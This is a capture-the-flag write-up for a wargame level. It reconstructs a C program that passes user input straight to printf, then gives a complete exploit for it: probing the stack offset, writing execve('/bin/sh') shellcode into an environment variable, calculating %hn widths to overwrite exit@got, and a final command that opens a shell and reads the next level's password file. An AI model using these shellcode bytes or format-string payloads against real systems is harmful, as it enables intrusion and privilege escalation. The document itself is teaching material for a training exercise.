# Level05

## Reconstructed source

```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    char buffer[100];
    int i;

    fgets(buffer, 100, stdin);
    for (i = 0; buffer[i]; i++)
    {
        if (buffer[i] > 0x40 && buffer[i] <= 0x5a)
            buffer[i] ^= 0x20;
    }
    printf(buffer);
    exit(0);
}
```

The loop lowercases every uppercase letter (`A`-`Z`, bytes `0x41`-`0x5a`) by
XOR-ing with `0x20`. Then the user buffer is printed and the program exits.

## Vulnerability

`printf(buffer)` prints a user-controlled string as the format string: a
**format string vulnerability**. With `%p`/`%x` we read the stack, and with
`%n`/`%hn` we write a chosen value to a chosen address.

The program has `NX disabled` (`readelf -l level05` shows `GNU_STACK ... RWE`),
so shellcode placed in an environment variable is executable. The plan:

1. Put shellcode in an env var and find its address.
2. Use the format string to overwrite `exit@got` with that address.
3. When `main` calls `exit(0)`, the `exit@plt` stub jumps through
   `exit@got` — now pointing at our shellcode, which runs as level06.

The lowercasing loop is a constraint: any byte we place in the buffer that falls
in `0x41`-`0x5a` gets mangled. All addresses we write into the buffer must avoid
that range (they do, see below).

## Exploitation

### Step 1 — find the format string offset

Our buffer starts at a fixed stack slot. We find which `%p` argument maps to the
start of the buffer by prefixing a known marker address and counting:

```sh
python -c 'print "\xe0\x97\x04\x08" + "%p " * 15' | ./level05
```

The marker `0x080497e0` shows up at the **10th** `%p`, so `%10$` points to the
first 4 bytes of our buffer, `%11$` to the next 4 bytes.

### Step 2 — find exit@got and the shellcode address

`exit@got` is the GOT slot the `exit@plt` stub reads. `objdump -d level05`
around `exit@plt` shows `jmp dword ptr [0x80497e0]`:

```sh
objdump -d level05 | grep -A2 '<exit@plt>'   # exit@got = 0x080497e0
```

Put the shellcode in an env var (200-byte NOP sled + 25-byte `execve("/bin/sh")`)
and read its address with a tiny helper:

```sh
export PWN=$(python -c 'print "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
# /tmp/ge.c: int main(int c,char**v){printf("%p\n", getenv(v[1]));}
/tmp/ge PWN                                   # 0xffffde3d
```

The sled is large so we can aim at its middle and tolerate the small address
shift between the helper and the real run. Target address = `0xffffde3d + ~99`
= **`0xffffdea0`** (lands well inside the sled, then slides into the shellcode).

### Step 3 — build the %n write

We write the 4-byte value `0xffffdea0` into `exit@got` (`0x080497e0`) as two
2-byte half-writes (`%hn`):

| target | value |
|--------|-------|
| `exit@got` = `0x080497e0` | `0xdea0` (low 2 bytes) |
| `exit@got+2` = `0x080497e2` | `0xffff` (high 2 bytes) |

Layout of the format string:

```
[0x080497e0][0x080497e2] %56992x %10$hn %8535x %11$hn
    arg10        arg11
```

- The two addresses (8 bytes) are args `%10$` and `%11$`.
- `%56992x` prints 56992 chars -> total printed = 8 + 56992 = 57000 = `0xdea0`
  -> `%10$hn` writes `0xdea0` into `exit@got`.
- `%8535x` adds 8535 -> total = 65535 = `0xffff` -> `%11$hn` writes `0xffff`
  into `exit@got+2`.
- Result: `exit@got = 0xffffdea0`.

Width maths: `56992 = 0xdea0 - 8`, `8535 = 0xffff - 0xdea0`.

None of the bytes we inject (`e0 97 04 08`, `e2 97 04 08`, and the ASCII
`%56992x%10$hn%8535x%11$hn`) fall in `0x41`-`0x5a`, so the lowercasing loop
leaves the payload intact.

### Step 4 — fire

```sh
(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%56992x%10$hn%8535x%11$hn"'; cat) | ./level05
whoami                                # level06
cat /home/users/level06/.pass
```

The `; cat` keeps stdin open for the spawned shell. `exit(0)` jumps through the
overwritten GOT entry into the sled, runs the shellcode, and gives a shell as
level06.

